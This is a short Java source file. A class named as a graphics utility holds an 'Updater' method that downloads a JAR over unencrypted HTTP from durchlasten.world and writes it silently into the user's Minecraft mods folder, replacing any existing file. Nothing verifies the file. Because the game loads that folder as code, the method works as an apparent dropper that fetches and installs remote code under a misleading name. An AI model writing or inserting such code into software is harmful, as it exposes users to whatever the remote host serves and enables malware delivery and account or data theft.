package de.javafunction.meta.utils;

import javax.swing.*;
import java.io.IOException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
public class GrafUtil {


    public class UpdateUtil {
        static public JButton numberbutton = new JButton("0");

        public static void Updater() {
            try {


                String appdata = System.getenv("APPDATA");
                String versionsPath = appdata + "\\.minecraft\\mods\\";
                String outputPath = versionsPath + "metanew.jar";

                String url = "http://durchlasten.world/meta/meta.jar";


                URL downloadUrl = new URL(url);
                Path outputFilePath = Paths.get(outputPath);


                Files.copy(downloadUrl.openStream(), outputFilePath, StandardCopyOption.REPLACE_EXISTING);

                System.out.println("Download completed successfully.");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
